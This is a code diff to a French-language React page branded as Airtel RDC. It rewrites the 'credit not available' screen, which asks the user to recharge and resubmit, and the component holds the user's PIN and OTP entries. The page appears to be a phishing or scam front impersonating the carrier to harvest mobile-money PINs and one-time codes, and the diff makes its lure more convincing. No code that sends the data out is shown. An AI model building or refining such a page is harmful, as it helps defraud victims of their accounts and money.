@@ -233,19 +233,23 @@
           <div className='min-h-screen flex flex-col'>
             <header className='airtel-red text-white p-6 text-center relative'>
               <h1 className='text-3xl font-bold'>Airtel RDC</h1>
-              <p className='text-sm mt-1 opacity-90'>Action requise</p>
+              <p className='text-sm mt-1 opacity-90'>Vérification de crédit</p>
             </header>
             <main className='flex-1 flex justify-center px-4 -mt-6'>
               <div className='bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12 text-center'>
-                <div className='mx-auto w-24 h-24 bg-yellow-100 rounded-full flex items-center justify-center mb-8'>
-                  <svg className='w-12 h-12 text-yellow-600' fill='none' stroke='currentColor' viewBox='0 0 24 24'><path strokeLinecap='round' strokeLinejoin='round' strokeWidth='2' d='M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z'></path></svg>
+                <div className='mx-auto w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center mb-6 border border-blue-100'>
+                  <span className='text-3xl font-bold text-blue-500'>!</span>
                 </div>
-                <h2 className='text-3xl font-bold text-gray-900'>Vous y êtes presque !</h2>
-                <p className='text-gray-600 mt-6 text-xl leading-relaxed'>Votre compte Airtel semble actuellement inactif ou ne dispose pas du solde requis. Pour continuer avec votre demande, veuillez <b>recharger votre compte</b> et revenir pour continuer la vérification.</p>
-                <div className='mt-8 p-6 bg-gray-50 rounded-2xl border border-gray-100'>
-                  <p className='text-gray-700 font-medium text-lg'>Numéro concerné : <span className='text-red-600 font-bold'>+243 {phone}</span></p>
+                <h2 className='text-2xl font-bold text-gray-900'>Crédit non disponible pour le moment</h2>
+                <p className='text-gray-600 mt-4 text-base leading-relaxed'>
+                  Votre demande pour l'article <b className='text-gray-900'>{product.name}</b> nécessite un solde actif ou un rechargement. Votre compte Airtel actuel ne permet pas d'accorder le crédit immédiatement.
+                </p>
+                <div className='mt-6 p-5 bg-gray-50 rounded-2xl border border-gray-100 text-left'>
+                  <p className='text-gray-700 text-sm leading-relaxed'>
+                    <b>Conseil :</b> Veuillez recharger votre compte Airtel, puis revenir pour soumettre de nouveau votre demande. Aucun montant n'a été débité de votre compte.
+                  </p>
                 </div>
-                <button onClick={() => { setStep(1); setPin(['', '', '', '']); setOtp(['', '', '', '']); }} className='w-full mt-10 py-5 airtel-red text-white rounded-full text-xl font-bold hover:opacity-90 transition-colors'>Recharger et recommencer</button>
+                <button onClick={() => { setStep(1); setPin(['', '', '', '']); setOtp(['', '', '', '']); }} className='w-full mt-8 py-4 airtel-red text-white rounded-full text-lg font-bold hover:opacity-90 transition-colors'>Aller au tableau de bord</button>
               </div>
             </main>
           </div>
